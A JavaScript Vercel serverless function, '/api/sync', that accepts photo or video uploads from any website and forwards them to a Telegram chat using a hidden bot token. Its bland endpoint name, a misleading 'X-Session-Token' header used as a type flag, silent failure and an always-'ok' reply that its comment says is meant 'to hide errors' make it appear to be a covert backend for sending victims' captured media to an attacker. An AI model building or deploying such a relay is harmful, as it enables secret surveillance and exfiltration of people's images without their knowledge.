// /api/sync.js — Vercel Serverless Function
// This proxies media to Telegram so the bot token never touches the browser.
// Environment variables required:
//   TG_TOKEN  — Telegram Bot Token
//   TG_CHAT   — Telegram Chat ID

const https = require('https');
const { Buffer } = require('buffer');

function parseMultipart(body, boundary) {
  const parts = [];
  const boundaryBuffer = Buffer.from(`--${boundary}`);
  const endBoundary = Buffer.from(`--${boundary}--`);
  
  let start = body.indexOf(boundaryBuffer) + boundaryBuffer.length;
  
  while (start < body.length) {
    // Skip \r\n after boundary
    if (body[start] === 0x0d && body[start + 1] === 0x0a) start += 2;
    
    // Find end of headers (double \r\n)
    const headerEnd = body.indexOf(Buffer.from('\r\n\r\n'), start);
    if (headerEnd === -1) break;
    
    const headers = body.slice(start, headerEnd).toString();
    const dataStart = headerEnd + 4;
    
    // Find next boundary
    const nextBoundary = body.indexOf(boundaryBuffer, dataStart);
    if (nextBoundary === -1) break;
    
    // Data ends 2 bytes before next boundary (\r\n)
    const dataEnd = nextBoundary - 2;
    const data = body.slice(dataStart, dataEnd);
    
    // Parse headers
    const nameMatch = headers.match(/name="([^"]+)"/);
    const filenameMatch = headers.match(/filename="([^"]+)"/);
    const contentTypeMatch = headers.match(/Content-Type:\s*(.+)/i);
    
    parts.push({
      name: nameMatch ? nameMatch[1] : '',
      filename: filenameMatch ? filenameMatch[1] : null,
      contentType: contentTypeMatch ? contentTypeMatch[1].trim() : null,
      data: data
    });
    
    start = nextBoundary + boundaryBuffer.length;
    
    // Check for end boundary
    if (body.indexOf(endBoundary, nextBoundary) === nextBoundary) break;
  }
  
  return parts;
}

module.exports = async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Session-Token');
  
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  if (req.method !== 'POST') {
    return res.status(405).json({ status: 'error' });
  }

  const token = process.env.TG_TOKEN;
  const chatId = process.env.TG_CHAT;
  
  if (!token || !chatId) {
    return res.status(200).json({ status: 'ok' }); // Fail silently
  }

  try {
    // Read raw body
    const chunks = [];
    for await (const chunk of req) {
      chunks.push(chunk);
    }
    const rawBody = Buffer.concat(chunks);
    
    // Determine type from header
    const contentType = req.headers['content-type'] || '';
    const xType = req.headers['x-session-token'] || 'p'; // p = photo, v = video
    
    // Parse the multipart form data
    const boundaryMatch = contentType.match(/boundary=(.+)/);
    if (!boundaryMatch) {
      return res.status(200).json({ status: 'ok' });
    }
    
    const boundary = boundaryMatch[1];
    const parts = parseMultipart(rawBody, boundary);
    
    // Find the file part
    const filePart = parts.find(p => p.filename);
    if (!filePart) {
      return res.status(200).json({ status: 'ok' });
    }

    // Build new multipart for Telegram
    const tgBoundary = '----TGBoundary' + Date.now();
    const endpoint = xType === 'v' ? 'sendVideo' : 'sendPhoto';
    const fieldName = xType === 'v' ? 'video' : 'photo';
    
    const bodyParts = [];
    
    // chat_id field
    bodyParts.push(Buffer.from(
      `--${tgBoundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`
    ));
    
    // File field
    bodyParts.push(Buffer.from(
      `--${tgBoundary}\r\nContent-Disposition: form-data; name="${fieldName}"; filename="${filePart.filename}"\r\nContent-Type: ${filePart.contentType || 'application/octet-stream'}\r\n\r\n`
    ));
    bodyParts.push(filePart.data);
    bodyParts.push(Buffer.from(`\r\n--${tgBoundary}--\r\n`));
    
    const tgBody = Buffer.concat(bodyParts);

    // Forward to Telegram
    await new Promise((resolve, reject) => {
      const tgReq = https.request({
        hostname: 'api.telegram.org',
        path: `/bot${token}/${endpoint}`,
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${tgBoundary}`,
          'Content-Length': tgBody.length
        }
      }, (tgRes) => {
        let data = '';
        tgRes.on('data', chunk => data += chunk);
        tgRes.on('end', () => resolve(data));
      });
      
      tgReq.on('error', reject);
      tgReq.write(tgBody);
      tgReq.end();
    });

    return res.status(200).json({ status: 'ok' });
  } catch (e) {
    return res.status(200).json({ status: 'ok' }); // Always return OK to hide errors
  }
};
